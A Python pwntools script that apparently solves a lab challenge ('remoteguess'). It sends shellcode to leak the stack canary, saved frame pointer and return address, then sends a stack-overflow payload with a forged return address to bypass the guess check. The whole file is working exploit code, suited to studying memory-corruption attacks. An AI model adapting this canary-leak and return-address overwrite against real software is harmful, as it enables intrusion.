#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

# payload = None
# if os.path.exists(exe):
#     with open(exe, 'rb') as f:
#         payload = f.read()

# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
# pause()

payload = asm(""" 
    enter  0x30 , 0
    mov    QWORD PTR [rbp-0x28],rdi
    mov    rax,QWORD PTR fs:0x28
    mov    QWORD PTR [rbp-0x8],rax
    mov    QWORD PTR [rbp-0x20],rax
    lea    rax,[rbp-0x20]
    mov    rcx,QWORD PTR [rax+0x28]
    lea    rax,[rbp-0x20]
    mov    rdx,QWORD PTR [rax+0x20]
    lea    rax,[rbp-0x20]
    mov    rax,QWORD PTR [rax+0x18]
    mov    r8,QWORD PTR [rbp-0x28]
    mov    rsi,rax
    lea    rax,[rip+label]       
    mov    rdi,rax
    call   r8
    leave  
    ret    
    label : .String "%llx\\n%llx\\n%llx\\n"
    """)

if payload != None:
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

myguess = 1234

print(r.recvline())
 # to cover the first useless message
 # to cover the first useless message
# the guess's canary is the same as solver , because all of the program's canaries are the same value
canary = int(r.recvline().strip(), 16)
# the guess's rbp is the same as solver , because both of their rbp is point to main function
rbp = int(r.recvline().strip(), 16)
# solver return address + 0x AB is the guess return address
ret = int(r.recvline().strip(), 16)+0xAB

__payload = flat([
    str(myguess).encode('ascii').ljust(24,b'\0'),
    canary,
    rbp,
    ret,
    b'\0' * 12,
    p32(myguess)
])

# print(canary)
# print(rbp)
# print(ret)
r.sendlineafter(b'Show me your answer? ', __payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
